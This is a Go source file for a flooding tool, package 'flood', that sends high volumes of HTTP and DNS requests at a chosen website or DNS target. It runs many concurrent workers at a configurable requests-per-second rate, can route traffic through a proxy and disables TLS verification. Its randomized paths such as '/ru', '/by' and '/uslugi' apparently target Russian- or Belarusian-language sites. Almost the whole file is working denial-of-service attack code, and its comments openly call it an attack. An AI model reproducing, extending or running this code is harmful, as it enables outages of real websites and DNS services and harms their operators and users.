package flood

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/miekg/dns"
)

// The target type that manages a target. A target can be a website, a dns, or something like that.
// TODO: refactor this into an interface and make New create different concrete types that deal with a particular kind of target.
type Target struct {
	sync.RWMutex
	address         string
	resolvedAddress []string
	port            int
	randomize       bool

	requestsPerSecond float64
	errorsPerSecond   float64
	requests          int64
	errors            int64

	requestCh chan string
	exitCh    chan struct{}

	httpTransport *http.Transport
	httpClient    *http.Client
	dnsClient     *dns.Client
	lastResolved  time.Time
}

// Creates a target instance with all the configurations needed for an attack.
func New(addr, proxy string) *Target {
	tr := &http.Transport{
		MaxIdleConns:       10000,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	dnsClient := &dns.Client{
		DialTimeout: time.Millisecond * 700,
		ReadTimeout: time.Second,
	}

	ret := &Target{
		address:       strings.TrimRight(strings.Trim(addr, " \r\n\t"), "/"),
		port:          80,
		randomize:     true,
		httpTransport: tr,
		httpClient:    client,
		dnsClient:     dnsClient,
	}

	ret.SetProxy(proxy)

	return ret
}

// Name Returns a name used in CLI multi-progressbar UI or GUI.
func (t *Target) Name() string {
	return t.address
}

// SetProxy sets proxy for http requests.
func (t *Target) SetProxy(proxy string) error {
	if proxy == "" {
		return nil
	}
	proxyURL, err := url.Parse(proxy)
	if err != nil {
		return err
	}
	t.httpTransport.Proxy = http.ProxyURL(proxyURL)
	return nil
}

// Run Executes an attack. Usually has to be called as a goroutine.
// N is the number of concurrent workers and maxRPS is the target requests per second.
func (t *Target) Run(ctx context.Context, N, maxRPS int, progress func(requests, errors int64)) {
	t.requestCh = make(chan string, N)
	timer := time.NewTicker(time.Second)
	timerGen := time.NewTicker(time.Second / time.Duration(maxRPS))
	defer close(t.requestCh)
	defer timer.Stop()
	defer timerGen.Stop()

	for i := 0; i < N; i++ {
		go t.flood(ctx)
	}

	for {
		select {
		case <-ctx.Done():
			return
		case <-t.exitCh:
			return
		case <-timerGen.C:
			if t.isHostResolved() {
				t.requestCh <- t.generate()
			}
		case <-timer.C:
			requests := float64(atomic.SwapInt64(&t.requests, 0))
			errors := float64(atomic.SwapInt64(&t.errors, 0))
			t.requestsPerSecond = (t.requestsPerSecond*3 + requests) / 4
			t.errorsPerSecond = (t.errorsPerSecond*3 + errors) / 4
			progress(int64(t.requestsPerSecond), int64(t.errorsPerSecond))
		}
	}
}

func (t *Target) flood(ctx context.Context) {
	for addr := range t.requestCh {
		addr = t.replaceWithResolvedIP(addr)
		if addr == "" {
			continue
		}

		atomic.AddInt64(&t.requests, 1)
		if t.perform(ctx, addr) != nil {
			atomic.AddInt64(&t.errors, 1)
		}
	}
}

func (t *Target) perform(ctx context.Context, addr string) error {
	switch {
	case strings.HasPrefix(addr, "dns://"):
		return t.performDNS(ctx, addr)
	// case strings.HasPrefix(addr, "smtp://"):
	// 	fallthrough
	// case strings.HasPrefix(addr, "pop3://"):
	// 	fallthrough
	default:
		return t.performHttp(ctx, addr)
	}
}

func (t *Target) generate() string {
	if strings.HasPrefix(t.address, "dns://") {
		return t.address
	}

	port := ""

	proto := "https://"
	if strings.HasPrefix(t.address, "https://") || strings.HasPrefix(t.address, "http://") {
		proto = ""
	}

	urls := []string{"/info", "/admin", "/ru", "/by", "/en", "/user", "/api", "/auth", "/prod", "/uslugi", "/blog", "/about"}
	url := urls[rand.Intn(len(urls))]
	if strings.HasSuffix(t.address, "/") {
		url = ""
	}

	return fmt.Sprintf("%s%s%s%s", proto, t.address, port, url)
}
